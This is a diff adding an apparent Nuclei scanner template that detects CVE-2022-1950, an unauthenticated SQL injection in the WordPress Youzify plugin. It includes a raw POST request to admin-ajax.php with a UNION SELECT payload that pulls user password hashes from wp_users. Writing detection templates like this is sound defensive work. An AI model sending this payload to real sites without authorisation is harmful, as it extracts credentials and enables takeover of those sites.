@@ -1,0 +1,32 @@
+id: wordpress-youzify-sqli
+info:
+  name: WordPress plugin Youzify SQL injection vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Youzify (formerly Youzer) is a popular BuddyPress plugin. Versions of the WordPress Plugin Youzify prior to 1.2.0 are vulnerable to SQL injection due to insufficient sanitization of parameters used in SQL statements via AJAX operations. This vulnerability allows unauthenticated users to exploit the site.
+  reference:
+    - https://wpscan.com/vulnerability/4352283f-dd43-4827-b417-0c55d0f4637d
+  classification:
+    cve-id:
+      - CVE-2022-1950
+    cvss-score: 9.8
+
+http:
+  - raw:
+      - |
+        POST /wp-admin/admin-ajax.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        User-Agent: Nuclei
+
+        action=youzify_media_pagination&data[type]=photos&page=1&data[group_id]=1 UNION ALL SELECT (SELECT CONCAT(md5(3432432421454),CHAR(0x3a),user_pass) from wp_users),2,3,4-- -
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "0aafecacb8482b50cbb60133f342d3f9"
